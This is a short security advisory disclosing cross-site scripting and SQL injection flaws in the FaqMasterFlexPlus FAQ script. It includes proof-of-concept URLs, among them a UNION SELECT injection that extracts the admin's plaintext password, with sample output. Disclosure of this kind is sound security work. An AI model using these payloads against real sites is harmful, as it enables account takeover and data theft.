Affected by:    Cross-Site Scripting & SQL injection





I. Introduction.

II. Description

Multiple flaws in FaqMasterFlexPlus have been discovered:


1) Cross Site Scripting:

The script faq.php suffers an XSS bug, specifically the variable $cat_name
it's not properly sanitized,
an attacker exploiting this flaw can perform an XSS attack to access the
targeted user cookies.

All Admin scripts to add/edit/delete categories and add/edit/delete faq
don't parse correctly the user supplied input too.


PoC:
http://www.example.com/[path/to/faq/]/faq.php?category_id=1&cat_name=[XSS]



2) SQL Injection (to exploit this issue it's necesarry magic_quotes_gpc set
to Off in the php.ini file).

All the scripts suffers for sql injections attacks in the querys to the
database.

PoC:
http://www.example.com/[path/to/faq]/faq.php?category_id=1'%20union%20select%201,1,user(),1/*


Then get a new line like this:

Q faquser@localhost


or a Proof of Concept to get the admin password:


http://www.example.com/[path/to/faq]/faq.php?category_id=1'%20union%20select%201,1,passwrd,1%20from%20users%20where%20userid='admin



Q supersecretpassword


bingo! ;)



Besides password is stored in plain text, this is a big security flaw.



This software is infected with many bugs and must be fully audited for
enforce the security.
